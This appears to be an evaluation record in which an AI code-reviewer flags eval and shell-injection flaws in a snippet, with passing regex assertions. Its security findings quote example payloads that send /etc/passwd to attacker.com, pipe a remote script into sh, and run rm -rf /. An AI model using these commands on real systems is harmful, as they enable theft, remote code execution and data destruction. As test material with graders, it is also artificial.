@@ -1,0 +1,66 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "provider_models": [
+    "claude-sonnet-5"
+  ],
+  "prompt_hash": "a02cc5410b11db1a62c0d90f21c97a686eacb0bb19a0a3793c982827e634dda2",
+  "output": "## Step 0: Diff\n\nNo repository diff available (`git diff` context not provided) — reviewing the pasted snippet directly as the changeset under review.\n\n## 1. Spec alignment\n\nNo acceptance criteria were provided with this snippet. Skipping — nothing to mark MET/MISSING against.\n\n## 2. Correctness\n\n- If `req.body` is already parsed by a body-parsing middleware (e.g., `express.json()`), it will be an object, and `'(' + req.body + ')'` will string-coerce it via `toString()` (typically `[object Object]`), producing a syntax error at runtime rather than the intended parse. Concrete input: any JSON request with `express.json()` enabled → `eval` throws `SyntaxError: Unexpected token 'o'`.\n\n## 3. Security\n\n- **BLOCKING — CWE-94 (Code Injection via eval).** `const payload = eval('(' + req.body + ')');` executes attacker-controlled input as JavaScript. Attack vector: send request body `1);require('child_process').execSync('curl attacker.com/$(cat /etc/passwd)');(1` — arbitrary code execution on the server. Fix: use `JSON.parse(req.body)` inside a try/catch, never `eval`.\n\n- **BLOCKING — CWE-78 (OS Command Injection).** `exec(\\`deploy.sh ${payload.target}\\`);` interpolates `payload.target` directly into a shell command. Attack vector: `target` = `\"; rm -rf / #\"` or `\"$(curl attacker.com/x|sh)\"` → arbitrary shell command execution. Fix: use `execFile('deploy.sh', [payload.target])` (avoids shell interpretation) and validate/allowlist `target` against expected values before use.\n\n## 4. Testability\n\nNo tests included in the snippet.\n\n## Verdict: **BLOCK**\n\nTwo critical, independently exploitable vulnerabilities (CWE-94 arbitrary code execution, CWE-78 command injection) chained together — an attacker fully controls both the eval'd payload and the shell command executed from it.",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?im)(?:^|\\n)\\s*(?:(?:##\\s*)?(?:\\*\\*)?Verdict:\\s*)?(?:\\*\\*)?BLOCK(?:\\*\\*)?(?:\\b|:)"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-94"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-78|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)eval|exec"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)evidence|attack vector|quoted evidence|request data|untrusted"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)fix|replace|execFile|JSON\\.parse"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    }
+  ],
+  "status": "pass",
+  "passed": true,
+  "input_tokens": 2,
+  "output_tokens": 1473,
+  "cost_usd": 0.02454,
+  "duration_ms": 17766
+}
